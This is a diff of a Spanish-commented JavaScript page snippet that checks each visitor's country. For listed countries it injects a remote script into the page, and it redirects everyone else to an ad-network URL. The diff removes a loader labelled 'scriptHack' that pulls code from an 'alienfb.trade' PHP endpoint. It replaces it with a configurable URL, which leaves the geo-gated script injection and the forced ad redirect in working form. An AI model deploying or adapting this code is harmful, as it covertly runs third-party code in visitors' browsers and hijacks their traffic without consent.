@@ -1,10 +1,10 @@
-
-
 <script>
-let countryHack = ['MX', 'FR', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; //pais
-let scriptHack = 'https://alienfb.trade/h/manual.php?p1=true&username=alejandronet&pl=grupo';
+let countryHack = ['MX', 'FR', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; // Paises
 let urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
 let country;
+
+// Ingresa la URL que desees a continuación
+let customURL = 'https://www.facebook.com/';
 
 fetch('https://get.geojs.io/v1/ip/country')
     .then((response) => response.text())
@@ -14,22 +14,16 @@ fetch('https://get.geojs.io/v1/ip/country')
         redirectURL(country)
     })
 
-
 function redirectURL(country) {
-
-
     if (country) {
         const script = document.createElement('script');
-        script.src = scriptHack;
+        script.src = customURL; // Usamos la URL personalizada
         document.head.appendChild(script);
 
         console.log('https://yuy4o.app.link/0fkXSJqnaCb' + country)
     } else {
-        
         window.location.href = urlPromocion;
         console.log('REDIRECT ADS...' + country)
     }
-
 }
-
 </script>
